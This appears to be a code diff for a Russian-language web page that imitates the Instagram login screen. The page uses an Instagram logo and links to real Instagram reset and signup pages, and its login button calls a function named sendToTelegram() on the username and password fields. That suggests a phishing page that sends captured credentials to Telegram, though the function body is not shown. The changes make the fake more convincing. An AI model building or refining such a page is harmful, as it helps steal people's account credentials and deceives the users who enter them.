@@ -12,31 +12,41 @@
         <div class="login-box">
             <img src="./image-removebg-preview (30).png" alt="Instagram Logo" class="logo">
             <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
-            <input type="password" id="password" placeholder="Пароль">
+            <div class="password-container">
+                <input type="password" id="password" placeholder="Пароль">
+                <button type="button" id="toggle-password" class="toggle-password">Показать</button>
+            </div>
+            
+
             <button class="login-btn" onclick="sendToTelegram()">Войти</button>
             <div class="separator">
                 <span>ИЛИ</span>
             </div>
-            <button class="fb-login"> Войти через Facebook</button>
-            <a href="#" class="forgot">Забыли пароль?</a>
+            <!-- Ссылка на авторизацию через Facebook -->
+            <img src="./image-removebg-preview (34).png" alt="Facebook Logo" class="fb-logo">
+            <div class="fb-login"> <a href="https://www.facebook.com/v12.0/dialog/oauth?client_id=YOUR_APP_ID&redirect_uri=YOUR_REDIRECT_URI" class="voit">
+                Войти через Facebook
+            </a>
+            </div>
+            <p id="error-message" class="error-message"></p> <!-- Ошибка теперь здесь -->
+            <a href="https://www.instagram.com/accounts/password/reset/?next=%2Fkse_2606%2F&locale=ru" class="forgot">Забыли пароль?</a>
         </div>
         <div class="register-box">
-            У вас нет аккаунта? <a href="#">Зарегистрироваться</a>
+            У вас нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/?next=%2Fkse_2606%2F&locale=ru">Зарегистрироваться</a>
         </div>
+
         <div class="app-links">
             <p>Установите приложение.</p>
             <div class="buttons">
-                <img src="./gp-1.png" alt="Google Play">
+                <a href="https://play.google.com/store/search?q=instagram&c=apps&hl=ru" target="_blank">
+                    <img class="google" src="./gp-1.png" alt="g">
+                </a>
+                <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
+                    <img  class="app" src="./appstore.png"  alt="a">
+                </a>
             </div>
         </div>
-    </div>
-
-    <!-- Модальное окно ошибки -->
-    <div id="error-popup" class="error-popup">
-        <div class="error-content">
-            <span id="error-close" class="error-close">&times;</span>
-            <p id="error-message">Ошибка! Неправильный логин или пароль. Попробуйте снова.</p>
-        </div>
+        
     </div>
 
     <footer>
